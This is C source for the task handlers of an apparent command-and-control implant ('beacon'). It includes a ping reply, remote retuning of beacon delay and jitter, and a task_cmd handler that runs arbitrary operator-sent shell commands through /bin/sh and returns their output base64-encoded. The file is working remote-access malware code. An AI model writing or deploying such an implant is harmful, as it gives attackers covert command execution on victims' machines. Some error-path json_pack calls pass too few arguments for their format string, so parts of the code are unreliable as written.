

#include "task-handlers.h"
#include "config.h"

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdarg.h>
#include <errno.h>
#include <wait.h>

extern char *agent_id;
extern struct {
    struct timespec mean_delay;
    struct timespec jitter;
} beacon_config;

extern pthread_mutex_t conf_mutex;
char *base64_encode(const unsigned char *data, size_t inbytes, size_t *outbytes);

json_t *task_ping(json_t *options) {
    int rc;
    return json_pack("{s:s, s:s}", "type", "text", "data", "pong");
}

json_t *task_conf(json_t *options) {
    //options could have an object with key "delay",
    //components s and ns which are json numbers (integer)
    //and/or an object with key "jitter"
    //parse into nsec and sec
    int rc;
    json_t *delay_json, *jitter_json;
    struct timespec delay_ts = beacon_config.mean_delay;
    struct timespec jitter_ts = beacon_config.jitter;
    delay_json = json_object_get(options, "delay");
    jitter_json = json_object_get(options, "jitter");

    if (json_is_object(delay_json)) {
        rc = json_unpack(delay_json, "{s:I, s:I}",
            "s", &delay_ts.tv_sec, "ns", &delay_ts.tv_nsec);
        if (rc) {
#ifdef DEBUG
            fprintf(stderr, "error: json unpack.\n");
#endif
            return NULL;
        }
        if (delay_ts.tv_sec < 0 || delay_ts.tv_nsec < 0
            || delay_ts.tv_nsec >= 1000000000L) {
            return json_pack("{s:s, s:s}",
                "error", "no changes: delay out of range");
        }
    }
    if (json_is_object(jitter_json)) {
        rc = json_unpack(jitter_json, "{s:I, s:I}",
                    "s", &jitter_ts.tv_sec, "ns", &jitter_ts.tv_nsec);
        if (rc) {
#ifdef DEBUG
            fprintf(stderr, "error: json unpack.\n");
#endif
            return NULL;
        }
        if (jitter_ts.tv_sec < 0 || jitter_ts.tv_nsec < 0
                || jitter_ts.tv_nsec >= 1000000000L) {
            return json_pack("{s:s, s:s}",
                "error", "no changes: jitter out of range");
        }
    }
    //respective variable will be set to its original value
    //if user hasn't input either delay, jitter or both
    pthread_mutex_lock(&conf_mutex);
    beacon_config.mean_delay = delay_ts;
    beacon_config.jitter = jitter_ts;
    pthread_mutex_unlock(&conf_mutex);
    return json_pack("{s:s, s:s}", "type", "text",
        "data", "configuration successfully updated.");
}

json_t *task_cmd(json_t *options) {
    int rc;
    const char *cmd_str;
    if (json_unpack(options, "{s:s}", "cmd_str", &cmd_str)) {
#ifdef DEBUG
        fprintf(stderr, "error: json unpack\n");
#endif
        return json_pack("{s:s}",
            "error", "invalid or missing command string");
    }
    int pipefd[2];
    if (pipe(pipefd) == -1) {
#ifdef DEBUG
        fprintf(stderr, "error: pipe\n");
#endif
        return NULL;
    }
    pid_t pid = fork();
    if (pid < 0) {
        close(pipefd[0]);
        close(pipefd[1]);
#ifdef DEBUG
        fprintf(stderr, "error: fork\n");
#endif
        return NULL;
    }
    if (pid == 0) {
        //child
        //redirecting stdout and stderr to pipe to capture command output
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);

        execl("/bin/sh", "sh", "-c", cmd_str, (char *)NULL);
        //fail
#ifdef DEBUG
        fprintf(stderr, "error: execl %s\n", strerror(errno));
#endif
        _exit(EXIT_FAILURE);
    }
    //parent
    close(pipefd[1]);
    char buf[AGENT_BUFSIZ];
    size_t total_size = 0;
    size_t capacity = AGENT_BUFSIZ;
    char *output = malloc(capacity);
    if (!output) {
        close(pipefd[0]);
#ifdef DEBUG
        fprintf(stderr, "error: malloc %s\n", strerror(errno));
#endif
        return NULL;
    }
    ssize_t nbytes;
    while ((nbytes = read(pipefd[0], buf, sizeof(buf))) > 0) {
        if (total_size + nbytes >= capacity) {
            capacity *= 2;
            char *tmp = realloc(output, capacity);
            if (!tmp) {
#ifdef DEBUG
                fprintf(stderr, "error: realloc %s\n", strerror(errno));
#endif
                free(output);
                close(pipefd[0]);
                return NULL;
            } //realloc success
            output = tmp;
        }
        memcpy(output + total_size, buf, nbytes);
        total_size += nbytes;
    }
    close(pipefd[0]);
    int status;
    waitpid(pid, &status, 0);
    output[total_size] = '\0';

    size_t encoded_len;
    char *encoded = base64_encode((unsigned char *)output, total_size, &encoded_len);
    free(output);

    if (!encoded) {
#ifdef DEBUG
        fprintf(stderr, "base64 encoding failed\n");
#endif
        return NULL;
    }
    json_t *result = json_pack("{s:s, s:s}", "type", "b64", "data", encoded);
    free(encoded);
    return result;
}

char *base64_encode(const unsigned char *data, size_t inbytes, size_t *outbytes) {
    static const char encoding_table[64] = {
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
        'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
        'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
        'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
        'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
        'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
        'w', 'x', 'y', 'z', '0', '1', '2', '3',
        '4', '5', '6', '7', '8', '9', '+', '/'};
    *outbytes = ((inbytes + 2)/3) * 4 + 1;
    char *outbuf = malloc(*outbytes);
    if (!outbuf) {
        return NULL;
    }
    char *p = outbuf;
    size_t i = 0;
    for (; i + 2 < inbytes; i+=3) {
        *p++ = encoding_table[data[i] >> 2];
        *p++ = encoding_table[((0x03 & data[i]) << 4) | (data[i+1] >> 4)];
        *p++ = encoding_table[((0x0f & data[i+1]) << 2) | (data[i+2] >> 6)];
        *p++ = encoding_table[0x3f & data[i+2]];
    }
    switch (inbytes % 3) {
        case 0:
            break;
        case 1: {
            *p++ = encoding_table[data[i] >> 2];
            *p++ = encoding_table[(0x03 & data[i]) << 4];
            *p++ = '=';
            *p++ = '=';
            break;
        }
        case 2: {
            *p++ = encoding_table[data[i] >> 2];
            *p++ = encoding_table[((0x03 & data[i]) << 4) | (data[i+1] >> 4)];
            *p++ = encoding_table[(0x0f & data[i+1]) << 2];
            *p++ = '=';
            break;
        }
    }
    *p = '\0';
    return outbuf;
}